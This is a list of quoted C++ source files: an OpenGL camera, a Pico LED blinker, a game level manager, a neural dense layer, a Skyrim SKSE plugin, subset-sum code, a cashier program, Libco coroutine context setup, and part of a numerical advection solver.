    "// Defini\u00e7\u00f5es para c\u00e2mera\n\n#include \"Camera.hpp\"\n\nCamera::Camera(const glm::vec3& position, int width, int height) {\n    this->position = position;\n    this->width = width;\n    this->height = height;\n}\n\nvoid Camera::Matrix(float FOVdeg, float nearPlane, float farPlane, const Shader &shader, const char *uniform) {\n    glm::mat4 view = glm::mat4(1.0f);\n    glm::mat4 proj = glm::mat4(1.0f);\n\n    view = glm::lookAt(this->position, this->position + this->orientation, this->up);\n    proj = glm::perspective(glm::radians(FOVdeg), static_cast<float>(this->width) / this->height, nearPlane, farPlane);\n\n    glUniformMatrix4fv(glGetUniformLocation(shader.ID, uniform), 1, GL_FALSE, glm::value_ptr(proj * view));\n}\n\nvoid Camera::Inputs(GLFWwindow *window, float delta) {\n    // keyboard\n\n    if (glfwGetKey(window, GLFW_KEY_W) == GLFW_PRESS) {\n        this->position += this->speed * this->orientation * delta;\n    }\n\n    if (glfwGetKey(window, GLFW_KEY_A) == GLFW_PRESS) {\n        this->position += this->speed * -glm::normalize(glm::cross(this->orientation, this->up)) * delta;\n    }\n\n    if (glfwGetKey(window, GLFW_KEY_S) == GLFW_PRESS) {\n        this->position += this->speed * -this->orientation * delta;\n    }\n\n    if (glfwGetKey(window, GLFW_KEY_D) == GLFW_PRESS) {\n        this->position += this->speed * glm::normalize(glm::cross(this->orientation, this->up)) * delta;\n    }\n\n    if (glfwGetKey(window, GLFW_KEY_SPACE) == GLFW_PRESS) {\n        this->position += this->speed * this->up * delta;\n    }\n\n    if (glfwGetKey(window, GLFW_KEY_LEFT_SHIFT) == GLFW_PRESS) {\n        this->position += this->speed * -this->up * delta;\n    }\n\n    // mouse\n    if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_LEFT) == GLFW_PRESS) {\n        glfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_HIDDEN);\n\n        if (this->firstClick) {\n            glfwSetCursorPos(window, (this->width / 2), (this->height / 2));\n            this->firstClick = false;\n        }\n\n        double mouseX, mouseY;\n        glfwGetCursorPos(window, &mouseX, &mouseY);\n\n        float rotX = this->sensivity * (float)(mouseY - (height / 2)) / height;\n\t\tfloat rotY = this->sensivity * (float)(mouseX - (width / 2)) / width;\n\n\t\t// Calculates upcoming vertical change in the Orientation\n\t\t//glm::vec3 newOrientation = glm::rotate(this->orientation, glm::radians(-rotX), glm::normalize(glm::cross(this->orientation, this->up)));\n\n        glm::mat4 rotationMatrix = glm::rotate(glm::mat4(1.0f), glm::radians(-rotX), glm::normalize(glm::cross(this->orientation, this->up)));\n        glm::vec3 newOrientation = glm::vec3(rotationMatrix * glm::vec4(this->orientation, 0.0f));\n        this->orientation = newOrientation;\n\n\t\t// Decides whether or not the next vertical Orientation is legal or not\n\t\t// if (abs(glm::oriented_angle(newOrientation, this->up) - glm::radians(90.0f)) <= glm::radians(85.0f))\n\t\t// {\n\t\t// \tthis->orientation = newOrientation;\n\t\t// }\n\n\t\t// Rotates the Orientation left and right\n\t\t//this->orientation = glm::rotate(this->orientation, glm::radians(-rotY), this->up);\n\n        rotationMatrix = glm::rotate(glm::mat4(1.0f), glm::radians(-rotY), this->up);\n        newOrientation = glm::vec3(rotationMatrix * glm::vec4(this->orientation, 0.0f));\n        this->orientation = newOrientation;\n\n\t\t// Sets mouse cursor to the middle of the screen so that it doesn't end up roaming around\n\t\tglfwSetCursorPos(window, (width / 2), (height / 2));\n\n    } else if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_LEFT) == GLFW_RELEASE) {\n        glfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_NORMAL);\n        this->firstClick = true;\n    }\n}\n",
    "#include <stdio.h>\n#include \"ws2812b.hpp\"\n#include \"pico/stdlib.h\"\n#include \"hardware/timer.h\"\n\n// Define a class to handle LED initialization and toggling\nclass LedController {\npublic:\n    // Constructor to initialize the LED pin\n    LedController(uint pin) : pin(pin) {\n        gpio_init(pin);                   // Initialize the GPIO pin\n        gpio_set_dir(pin, GPIO_OUT);      // Set the pin as output\n        gpio_put(pin, false);             // Set the LED to off initially\n    }\n\n    // Method to toggle the LED\n    void toggle() {\n        gpio_xor_mask(1u << pin);         // Toggle the LED state\n    }\n\nprivate:\n    uint pin; // Store the pin number\n};\n\nint main() {\n    stdio_init_all(); // Initialize the standard input/output\n\n    LedController led(PICO_DEFAULT_LED_PIN); // Create an instance of LedController for the default LED pin\n\n    LED_ARRAY ledArray;\n    ledArray.ConfigureGradient(0xFF0000, 0x0000FF); // Gradient from red to blue\n    ledArray.SendData(); // Transmit the data to LEDs\n    \n    while (true) {\n        sleep_ms(1000);    // Wait for 1000 ms\n        led.toggle();      // Toggle the LED\n    }\n}\n",
    "#include \"PreCompiledHeader.h\"\n#include \"Level.h\"\n#include \"Actor/Actor.h\"\n\nLevel::Level()\n{\n}\n\nLevel::~Level()\n{\n\t// \uba54\ubaa8\ub9ac \ud574\uc81c.\n\tfor (Actor* actor : actors)\n\t{\n\t\tdelete actor;\n\t}\n}\n\nvoid Level::AddActor(Actor* newActor)\n{\n\t//actors.PushBack(newActor);\n\taddRequestedActor = newActor;\n}\n\nvoid Level::ProcessAddedAndDestroyedActor()\n{\n\t// \uc561\ud130 \uc21c\ud68c \ud6c4 \uc0ad\uc81c \uc694\uccad\ub41c \uc561\ud130\ub97c \ucc98\ub9ac.\n\tfor (int ix = 0; ix < actors.Size();)\n\t{\n\t\tif (actors[ix]->isExpired)\n\t\t{\n\t\t\tdelete actors[ix];\n\t\t\tactors[ix] = nullptr;\n\t\t\tactors.Erase(ix);\n\t\t\tcontinue;\n\t\t}\n\n\t\t++ix;\n\t}\n\n\t// \ucd94\uac00 \uc694\uccad\ub41c \uc561\ud130 \ucc98\ub9ac.\n\tif (addRequestedActor)\n\t{\n\t\tactors.PushBack(addRequestedActor);\n\t\taddRequestedActor = nullptr;\n\t}\n}\n\nvoid Level::Update(float deltaTime)\n{\n\t// \ub808\ubca8\uc5d0 \ud3ec\ud568\ub41c \uc561\ud130\ub97c \uc21c\ud68c\ud558\uba74\uc11c Update \ud568\uc218 \ud638\ucd9c.\n\tfor (Actor* actor : actors)\n\t{\n\t\t// \uc561\ud130\uac00 \ube44\ud65c\uc131\ud654 \uc0c1\ud0dc\uc774\uac70\ub098, \uc0ad\uc81c \uc694\uccad\ub41c \uacbd\uc6b0 \uac74\ub108\ub6f0\uae30.\n\t\tif (!actor->isActive || actor->isExpired)\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tactor->Update(deltaTime);\n\t}\n}\n\nvoid Level::Draw()\n{\n\t// \ub808\ubca8\uc5d0 \ud3ec\ud568\ub41c \uc561\ud130\ub97c \uc21c\ud68c\ud558\uba74\uc11c Draw \ud568\uc218 \ud638\ucd9c.\n\tfor (Actor* actor : actors)\n\t{\n\t\t// \uc561\ud130\uac00 \ube44\ud65c\uc131\ud654 \uc0c1\ud0dc\uc774\uac70\ub098, \uc0ad\uc81c \uc694\uccad\ub41c \uacbd\uc6b0 \uac74\ub108\ub6f0\uae30.\n\t\tif (!actor->isActive || actor->isExpired)\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tactor->Draw();\n\t}\n}",
    "#include \"dense.h\"\n#include <iostream>\n#include <fstream> // For file handling\n#include <cmath>\n#include <algorithm>\n#include <array>\n#include <stdexcept>\n#include <chrono> // For timing\n\nvoid softmax(std::vector<float>& tensor) {\n    float max_val = *std::max_element(tensor.begin(), tensor.end());\n    float sum = 0.0f;\n    for (auto& value : tensor) {\n        value = std::exp(value - max_val);\n        sum += value;\n    }\n    for (auto& value : tensor) {\n        value /= sum;\n    }\n}\n\nvoid dense(const std::vector<float>& input, const std::vector<float>& weights,\n           const std::vector<float>& bias, std::vector<float>& output,\n           const std::array<int, 2>& input_shape, const std::array<int, 2>& output_shape,\n           const std::string& activation, std::string layername) {\n\n    // Validate the sizes of input, weights, and output\n    int input_size = input_shape[1];\n    int output_size = output_shape[1];\n\n    output.resize(output_size, 0.0f); \n\n    if (weights.size() != input_size * output_size) {\n        throw std::runtime_error(\"Weights size does not match input_size * output_size.\");\n    }\n\n    if (bias.size() != output_size) {\n        throw std::runtime_error(\"Bias size does not match output_size.\");\n    }\n\n    // Start timing the dense operation\n    auto start_time = std::chrono::high_resolution_clock::now();\n\n    // Perform the dense operation (matrix multiplication + bias)\n    for (int o = 0; o < output_size; ++o) {\n        float sum = 0.0f;\n        for (int i = 0; i < input_size; ++i) {\n            sum += input[i] * weights[i * output_size + o];\n        }\n        output[o] = sum + bias[o];\n    }\n\n    // End timing the dense operation\n    auto end_time = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double> execution_time = end_time - start_time;\n\n    // Apply activation if needed\n    if (activation == \"softmax\") {\n        softmax(output);\n    }\n\n    // Print dense layer shape\n    std::cout << \"Dense Output Shape: [\" << output_size << \"]\" << std::endl;\n\n    // Print execution time\n    std::cout << \"Dense Layer Execution Time: \" << execution_time.count() << \" seconds\" << std::endl;\n\n    // Write the output to a text file\n    std::ofstream outfile(\"F:/MCW/c++ application/Project_Root/data/cpp_outputs/\"+layername+\".txt\");\n    if (outfile.is_open()) {\n        for (int i = 0; i < output_size; i++) {\n            outfile << output[i] << \" \";\n        }\n        outfile << \"\\n\";\n        outfile.close();\n    std::cout << \"Output of First channel saved to data/cpp_outputs/\"+layername+\".txt\" << std::endl;\n    } else {\n        std::cerr << \"Error opening file for writing!\" << std::endl;\n    }\n\n    std::cout << \"=====================================================\\n\";\n}\n",
    "#include \"SimplyKnock.h\"\n#include \"../skse64/GameReferences.h\"\n#include \"../skse64/GameBSExtraData.h\"\n#include \"../skse64/GameRTTI.h\"\n\n// 0C\nclass ExtraTeleport : public BSExtraData\n{\npublic:\n\tvirtual ~ExtraTeleport();\n\n\t// 20\n\tstruct Data\n\t{\n\t\tUInt32   refHandle;\n\t\tfloat    unk04;\n\t\tfloat    unk08;\n\t\tfloat    unk0C;\n\t\tfloat    unk10;\n\t\tfloat    unk14;\n\t\tfloat    unk18;\n\t\tUInt8    unk1C;\n\t};\n\tData * data;\n};\n\nnamespace SimplyKnockNamespace {\n\tTESObjectREFR * GetLinkedDoor(StaticFunctionTag *base, TESObjectREFR* object) {\n\t\t// Return the Linked Door reference of this object reference.\n\n\t\tif (!object) return NULL;\n\t\t\n\t\t//Get the ExtraTeleport\n\t\tExtraTeleport* teleport = DYNAMIC_CAST(object->extraData.GetByType(kExtraData_Teleport), BSExtraData, ExtraTeleport);\n\t\tif (!teleport) return NULL;\n\n\t\t//Get the RefHandle\n\t\tUInt32 handle = NULL;\n\t\tif (teleport->data)\n\t\t\thandle = teleport->data->refHandle;\n\t\tif (handle == (*g_invalidRefHandle) || handle == 0) return NULL;\n\n\t\t//Get the Reference\n\t\tNiPointer<TESObjectREFR> reference = nullptr;\n\t\tLookupREFRByHandle(handle, reference);\n\n\t\treturn reference;\n\t}\n\n\tbool RegisterFuncs(VMClassRegistry* registry) {\n\t\tregistry->RegisterFunction(\n\t\t\tnew NativeFunction1 <StaticFunctionTag, TESObjectREFR*, TESObjectREFR*>(\"GetLinkedDoor\", \"SimplyKnockSKSE\", SimplyKnockNamespace::GetLinkedDoor, registry));\n\n\t\treturn true;\n\t}\n} \n",
    "#include <iostream>\n#include <vector>\n#include <limits>\nusing namespace std;\n\nstd::vector<int> subsetSum(const std::vector<int>& nums, int target) {\n    int n = nums.size();\n\n    // DP table to store possible subset sums\n    std::vector<std::vector<bool>> dp(n + 1, std::vector<bool>(target + 1, false));\n\n    // DP table to store minimum product of weights for each subset sum\n    std::vector<std::vector<long long>> minProduct(n + 1, std::vector<long long>(target + 1, std::numeric_limits<long long>::max()));\n\n    // Base case: Subset with sum 0 is always possible (empty set)\n    for (int i = 0; i <= n; ++i) {\n        dp[i][0] = true;\n        minProduct[i][0] = 1;  // Minimum product for sum 0 is 1 (empty set)\n    }\n\n    // Fill the DP tables\n    for (int i = 1; i <= n; ++i) {\n        for (int j = 1; j <= target; ++j) {\n            dp[i][j] = dp[i - 1][j]; // Exclude current number\n            if (nums[i - 1] <= j) { // Include current number if it fits\n                dp[i][j] = dp[i][j] || dp[i - 1][j - nums[i - 1]];\n            }\n\n            // Update minimum product\n            if (dp[i][j]) {\n                if (nums[i - 1] <= j && dp[i - 1][j - nums[i - 1]]) {\n                    minProduct[i][j] = std::min(minProduct[i][j], minProduct[i - 1][j - nums[i - 1]] * nums[i - 1]);\n                }\n                minProduct[i][j] = std::min(minProduct[i][j], minProduct[i - 1][j]);\n            }\n        }\n    }\n\n    // If no subset sums to the target, return an empty vector\n    if (!dp[n][target]) {\n        return {};\n    }\n\n    // Trace back the subset from the DP tables\n    std::vector<int> result;\n    int currTarget = target;\n    for (int i = n; i > 0 && currTarget > 0; --i) {\n        if (currTarget >= nums[i - 1] && minProduct[i][currTarget] == minProduct[i - 1][currTarget - nums[i - 1]] * nums[i - 1]) {\n            result.push_back(nums[i - 1]);\n            currTarget -= nums[i - 1];\n        }\n    }\n\n    return result;\n}",
    "#include <iostream>\n#include <iomanip>\nusing namespace std;\nint main()\n{\n    // orang ke 2\n    cout << \"##   Program Aplikasi Kasir  ##\" << endl;\n    cout << \"===============================\" << endl\n         << endl;\n\n    const int MAX_BARANG = 10;\n    string namaBarang[MAX_BARANG];\n    long hargaBarang[MAX_BARANG];\n    int jumlahBArang[MAX_BARANG];\n    long jumlahTotalBarang;\n    long totalHarga = 0;\n    long jumlahBayar = 0;\n\n    cout << \"##   Selamat Datang di Mini Market ILKOOM    ##\" << endl\n         << endl;\n\n    cout << \"Masukan jumlah barangan yangan ingin dibeli : \";\n    cin >> jumlahTotalBarang;\n    cout << endl;\n\n    if (jumlahTotalBarang <= 0 || jumlahTotalBarang > MAX_BARANG)\n    {\n        cout << \"Jumlah barang tidak valid\" << endl;\n        return 0;\n    }\n    for (int i = 0; i < jumlahTotalBarang; i++)\n    {\n        cout << \"Barang ke : \" << i + 1 << endl;\n        cout << \"Nama Barang : \";\n        getline(cin >> ws, namaBarang[i]);\n        cout << \"Harga Satuan : \";\n        cin >> hargaBarang[i];\n        cout << \"Jumlah : \" << namaBarang[i] << \" yang dibeli : \";\n        cin >> jumlahBArang[i];\n        cout << endl;\n    }\n    cout << endl;\n\n    // orang ke 2\n}",
    "/*\n* Tencent is pleased to support the open source community by making Libco\navailable.\n\n* Copyright (C) 2014 THL A29 Limited, a Tencent company. All rights reserved.\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n*\thttp://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing,\n* software distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n#include \"coctx.h\"\n#include <stdio.h>\n#include <string.h>\n\n#define ESP 0\n#define EIP 1\n#define EAX 2\n#define ECX 3\n// -----------\n#define RSP 0\n#define RIP 1\n#define RBX 2\n#define RDI 3\n#define RSI 4\n\n#define RBP 5\n#define R12 6\n#define R13 7\n#define R14 8\n#define R15 9\n#define RDX 10\n#define RCX 11\n#define R8 12\n#define R9 13\n\n//----- --------\n// 32 bit\n// | regs[0]: ret |\n// | regs[1]: ebx |\n// | regs[2]: ecx |\n// | regs[3]: edx |\n// | regs[4]: edi |\n// | regs[5]: esi |\n// | regs[6]: ebp |\n// | regs[7]: eax |  = esp\nenum {\n  kEIP = 0,\n  kEBP = 6,\n  kESP = 7,\n};\n\n//-------------\n// 64 bit\n// low | regs[0]: r15 |\n//    | regs[1]: r14 |\n//    | regs[2]: r13 |\n//    | regs[3]: r12 |\n//    | regs[4]: r9  |\n//    | regs[5]: r8  |\n//    | regs[6]: rbp |\n//    | regs[7]: rdi |\n//    | regs[8]: rsi |\n//    | regs[9]: ret |  //ret func addr\n//    | regs[10]: rdx |\n//    | regs[11]: rcx |\n//    | regs[12]: rbx |\n// hig | regs[13]: rsp |\nenum {\n  kRDI = 7,\n  kRSI = 8,\n  kRETAddr = 9,\n  kRSP = 13,\n};\n\n// 64 bit\nextern \"C\" {\nextern void coctx_swap(coctx_t*, coctx_t*) asm(\"coctx_swap\");\n};\n#if defined(__i386__)\nint coctx_init(coctx_t* ctx) {\n  memset(ctx, 0, sizeof(*ctx));\n  return 0;\n}\n#ifdef ZPort\nenum {\n    kFS0 = 0,\n    kFS4 = 2,\n    kFS8 = 3,\n};\nint coctx_make(coctx_t* ctx, coctx_pfn_t pfn, const void* s, const void* s1) {\n    /// Z#20250105, doc\n    ///  ret to __fastcall zport_coctx_swap(const void* s, const void* s1)\n  // make room for coctx_param\n  char* sp = ctx->ss_sp + ctx->ss_size - sizeof(coctx_param_t);\n  sp = (char*)((unsigned long)sp & -16L);\n\n  coctx_param_t* param = (coctx_param_t*)sp;\n  void** ret_addr = (void**)(sp - sizeof(coctx_param_t));\n  *ret_addr = (void*)pfn;\n  param->s1 = s;\n  param->s2 = s1;\n\n  memset(ctx->regs, 0, sizeof(ctx->regs));\n\n  ctx->regs[kFS0] = (void*)-1;\n  ctx->regs[kFS4] = ctx->ss_sp + ctx->ss_size;\n  ctx->regs[kFS8] = ctx->ss_sp;\n  ctx->regs[kESP] = (char*)(sp) - sizeof(coctx_param_t);\n  return 0;\n}\n#else\nint coctx_make(coctx_t* ctx, coctx_pfn_t pfn, const void* s, const void* s1) {\n    /// Z#20250105, doc\n    ///  make call frame for pfn\n  // make room for coctx_param\n  char* sp = ctx->ss_sp + ctx->ss_size - sizeof(coctx_param_t);\n  sp = (char*)((unsigned long)sp & -16L);\n\n  coctx_param_t* param = (coctx_param_t*)sp;\n  void** ret_addr = (void**)(sp - sizeof(void*) * 2);\n  *ret_addr = (void*)pfn;\n  param->s1 = s;\n  param->s2 = s1;\n\n  memset(ctx->regs, 0, sizeof(ctx->regs));\n\n  ctx->regs[kESP] = (char*)(sp) - sizeof(void*) * 2;\n  return 0;\n}\n#endif // ZPort\n#elif defined(__x86_64__)\nint coctx_make(coctx_t* ctx, coctx_pfn_t pfn, const void* s, const void* s1) {\n  char* sp = ctx->ss_sp + ctx->ss_size - sizeof(void*);\n  sp = (char*)((unsigned long)sp & -16LL);\n\n  memset(ctx->regs, 0, sizeof(ctx->regs));\n  void** ret_addr = (void**)(sp);\n  *ret_addr = (void*)pfn;\n\n  ctx->regs[kRSP] = sp;\n\n  ctx->regs[kRETAddr] = (char*)pfn;\n\n  ctx->regs[kRDI] = (char*)s;\n  ctx->regs[kRSI] = (char*)s1;\n  return 0;\n}\n\nint coctx_init(coctx_t* ctx) {\n  memset(ctx, 0, sizeof(*ctx));\n  return 0;\n}\n\n#endif\n",
    "#include <cstdio>\n#include <cstdlib>\n#include <cmath>\n\n#include <cstring>\n\n#define eps 1e-15\n\n\n\n// void u_setting(double *u, double (*u_function()), int N) - \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0447\u0435\u0440\u0435\u0437 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c\n\ninline double u_function(/* double *u_ar,  */double x, double time) // \u0437\u0430\u0432\u0438\u0441\u0438\u0442 \u043e\u0442 \u0432\u0440\u0435\u043c\u0435\u043d\u0438 \u0438 \u0442\u043e\u0447\u043a\u0438 x\n{\n    return 1;\n    //return 0; // \u0442\u0443\u0442 \u0444\u043e\u0440\u043c\u0443\u043b\u043e\u0439 \u0437\u0430\u0434\u0430\u0435\u0442\u0441\u044f \u0441\u0430\u043c\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u044f u\n}\ninline double p0_function(double x) // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0440\u0430\u0441\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u044f \u043f\u043b\u043e\u0442\u043d\u043e\u0441\u0442\u0438 \u0432 \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u0432\u0440\u0435\u043c\u0435\u043d\u0438\n{\n    return (x > 0.2 && x < 0.4) ? 1 : 0;\n    // return sin(2 * 3.1415926 * x);\n    // return 0.25;\n}\ndouble f(double x) // \u0442\u0430\u043a\u0436\u0435 \u043c\u043e\u0436\u043d\u043e \u0437\u0430\u0434\u0430\u0442\u044c \u0435\u0435 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u0432 \u043f\u043e\u043b\u0443\u0446\u0435\u043b\u044b\u0445 \u0442\u043e\u0447\u043a\u0430\u0445\n{\n    return 0;\n    // return 0.1;\n}\n\n// \u043f\u043e\u043c\u043d\u0438\u043c, \u0447\u0442\u043e \u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u044f\u0445 \u043d\u0438\u0436\u0435 \u043c\u044b \u0437\u0430\u0434\u0430\u0435\u043c \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0432 \u043f\u043e\u043b\u0443\u0446\u0435\u043b\u044b\u0445 \u0442\u043e\u0447\u043a\u0430\u0445\n// \u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u044f\u0445 u_function, p0, f, x - \u044d\u0442\u043e \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442 (\u0442\u043e\u0447\u043d\u0435\u0435 \u043f\u043e\u043b\u0443\u0446\u0435\u043b\u0430\u044f \u0442\u043e\u0447\u043a\u0430)\n// u_ar - \u044d\u0442\u043e \u043c\u0430\u0441\u0441\u0438\u0432 \u0434\u043b\u044f u\nvoid setup_u(double *u_ar, double h, double t, int N){\n    for (int i = 0; i < N; i++){\n        u_ar[i] = u_function(h * (i + 0.5), t);\n    }\n}\n\nvoid setup_p0(double *p0, double h, double t, int N){\n    for (int i = 0; i < N; i++){\n        p0[i] = p0_function((i + 0.5) * h);\n    }\n}\n\nvoid setup_f(double *right_part, double h, double t, int N){\n    for (int i = 0; i < N; i++){\n        right_part[i] = f((i + 0.5) * h);\n    }\n    // printf(\"%lf  \\n\", (N) * h);\n}\n\ndouble sgn(double x)\n{\n    if (x < eps && -x < eps) return 0;\n    else if (x > 0) return 1.0;\n    return -1.0;\n}\n\nvoid print_matrix(double *p15, double *p5, double *p_5, double *right_part, int N){\n    if (N <= 15) // \u0435\u0441\u043b\u0438 \u043d\u0435 \u0441\u043b\u0438\u0448\u043a\u043e\u043c \u043c\u043d\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432\n        for (int i = 0; i < N; i++){\n            for (int j = 0; j < N; j++){\n                // \u043c\u043e\u0436\u043d\u043e \u043f\u0435\u0440\u0435\u0434\u0435\u043b\u0430\u0442\u044c \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0432\u044b\u0432\u043e\u0434\u0430 \u0442\u0430\u043a, \u0447\u0442\u043e\u0431\u044b \u043e\u043d\u0430 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e \u0432\u044b\u0432\u043e\u0434\u0438\u043b\u0430 \u0437\u043d\u0430\u043a\u0438 \u0434\u043b\u044f \u0440\u043e\u0432\u043d\u043e\u0433\u043e \u0432\u044b\u0432\u043e\u0434\u0430\n                if (j < i - 1 || j > i + 1)         printf(\"        \");\n                else if (j == i - 1 && i != 0)      printf(\"%5.1lf   \", *(p_5 + i));\n                else if (j == i)                    printf(\"%5.1lf   \", *(p5 + i));\n                else if (j == i + 1 && i != N - 1)  printf(\"%5.1lf   \", *(p15 + i));\n            }\n            printf(\" | %5.5lf\\n\", right_part[i]);\n        }\n}\n\nvoid print_array(double *mas, int N){\n    printf(\"[\");\n    for (int i = 0; i < N; i++) printf(\" %lf; \", mas[i]);\n    printf(\"]\\n\");\n}\n\n// i --- \u044d\u0442\u043e \u043d\u043e\u043c\u0435\u0440 \u0443\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u044f, t_1 - \u044d\u0442\u043e \u0435\u0434\u0438\u043d\u0438\u0446\u0430 \u0434\u0435\u043b\u0435\u043d\u043d\u0430\u044f \u043d\u0430 \u0448\u0430\u0433 \u043f\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438\nvoid setup_eq(double *u, double *phalf1, double *phalf, double *p_half, double *right_part, double *p_prev, double t_1, /* double h, */ int i, int N)\n{\n    /* phalf[i] += 1.0 / t; // \u044d\u0442\u043e \u043b\u0435\u0432\u0430\u044f \u0447\u0430\u0441\u0442\u044c\n    right_part[i] += p_prev[i] / t; */\n\n    phalf[i] += t_1;\n    right_part[i] += t_1 * p_prev[i];\n\n\n\n    if (i == N-1); // \u044d\u0442\u043e \u043f\u043e\u0442\u043e\u043a \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u0430\u0432\u0443\u044e \u0433\u0440\u0430\u043d\u0438\u0446\u0443\n    else if (sgn(u[i]) > 0 && sgn(u[i+1]) > 0){\n        phalf1[i] += (0.5 * u[i+1] - 0.5 * (u[i] + u[i+1])) * N;\n        phalf[i]  += (0.5 * u[i] + 0.5 * (u[i] + u[i+1])) * N; //p_half[i] += 0;\n    }\n    else if (sgn(u[i]) < 0 && sgn(u[i+1]) < 0){\n        phalf1[i] += (0.5 * u[i+1] + 0.5 * (u[i] + u[i+1])) * N;\n        phalf[i]  += (0.5 * u[i] - 0.5 * (u[i] + u[i+1])) * N; //p_half[i] += 0;\n    }\n    else if ((int)sgn(u[i]) != (int)sgn(u[i+1]) && u[i] + u[i+1] > 0){\n        phalf[i]  += 0.5 * (u[i] + u[i+1]) * N;\n    }\n    else{ // \u043c\u043e\u0436\u0435\u0442 \u043b\u0438 \u044d\u0442\u043e \u0443\u0441\u043b\u043e\u0432\u0438\u0435 \u043d\u0435 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u0435\u0441\u043b\u0438 \u044f \u0441\u0440\u0430\u0432\u043d\u0438\u0432\u0430\u044e \u0441 \u043d\u0443\u043b\u0435\u043c \u0438 \u043a\u0430\u043a \u044d\u0442\u043e \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c\u0441\u044f, \u0435\u0441\u043b\u0438 0 \u043b\u0435\u0436\u0438\u0442 \u0432 \u043e\u043a\u0440\u0435\u0441\u0442\u043d\u043e\u0441\u0442\u0438 1e-15\n        phalf1[i] += 0.5 * (u[i] + u[i+1]) * N;\n    }\n\n\n\n    if (i == 0); // \u044d\u0442\u043e \u043f\u043e\u0442\u043e\u043a \u0447\u0435\u0440\u0435\u0437 \u043b\u0435\u0432\u0443\u044e \u0433\u0440\u0430\u043d\u0438\u0446\u0443\n    else if (sgn(u[i-1]) > 0 && sgn(u[i]) > 0){\n        phalf[i]  -= (0.5 * u[i] - 0.5 * (u[i] + u[i-1])) * N;\n        p_half[i] -= (0.5 * u[i-1] + 0.5 * (u[i] + u[i-1])) * N;\n    }\n    else if (sgn(u[i-1]) < 0 && sgn(u[i]) < 0){\n        phalf[i]  -= (0.5 * u[i] + 0.5 * (u[i] + u[i-1])) * N;\n        p_half[i] -= (0.5 * u[i-1] - 0.5 * (u[i] + u[i-1])) * N;\n    }\n    else if ((int)sgn(u[i-1]) != (int)sgn(u[i]) && u[i] + u[i-1] < 0){\n        phalf[i]  -= 0.5 * (u[i-1] + u[i]) * N;\n    }\n    else{\n        p_half[i] -= 0.5 * (u[i-1] + u[i]) * N;\n    }\n}\n\nvoid solver(double *p_half, double *phalf, double *phalf1, double *pprev, int N){ // pprev - \u044d\u0442\u043e \u043f\u0440\u0430\u0432\u0430\u044f \u0447\u0430\u0441\u0442\u044c, \u0438 \u0432\u043c\u0435\u0441\u0442\u0435 \u0441 \u0442\u0435\u043c \u0442\u0443\u0434\u0430 \u043f\u0438\u0448\u0435\u0442\u0441\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0435\n    phalf1[0] /= phalf[0];\n    pprev[0] /= phalf[0];\n    phalf[0] = 1;\n    for (int i = 1; i <= N - 1; i++){\n        // p_half[i] -= p_half[i] * phalf[i - 1];\n        pprev[i]  -= p_half[i] * pprev[i - 1];\n        phalf[i]  -= p_half[i] * phalf1[i - 1];\n        p_half[i] = 0;\n        // \u0441\u0435\u0439\u0447\u0430\u0441 \u044d\u043b\u0435\u043c\u0435\u043d\u0442 p_half[i] = 0\n        phalf1[i] /= phalf[i];\n        pprev[i]  /= phalf[i];\n        phalf[i]  =  1;\n    }\n    for (int i = N - 1; i >= 1; i--){\n        // pprev[i] = f[i]; // \u0437\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u0435\u043c \u043f\u043b\u043e\u0442\u043d\u043e\u0441\u0442\u044c \u043d\u0430 \u043f\u0440\u043e\u0448\u043b\u043e\u043c \u0448\u0430\u0433\u0435\n        pprev[i - 1] -= pprev[i] * phalf1[i - 1];\n        phalf1[i - 1] = 0;\n    }\n}\n\n// \u0437\u0430\u0434\u0430\u043d\u0438\u0435 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0443\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u0439 (\u0437\u0430\u0434\u0430\u043d\u0438\u0435 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442\u043e\u0432 \u0432\u044b\u0448\u0435, \u043d\u0430 \u0438 \u043d\u0438\u0436\u0435 \u0434\u0438\u0430\u0433\u043e\u043d\u0430\u043b\u0438), t_1 - \u044d\u0442\u043e \u0435\u0434\u0438\u043d\u0438\u0446\u0430 \u0434\u0435\u043b\u0435\u043d\u043d\u0430\u044f \u043d\u0430 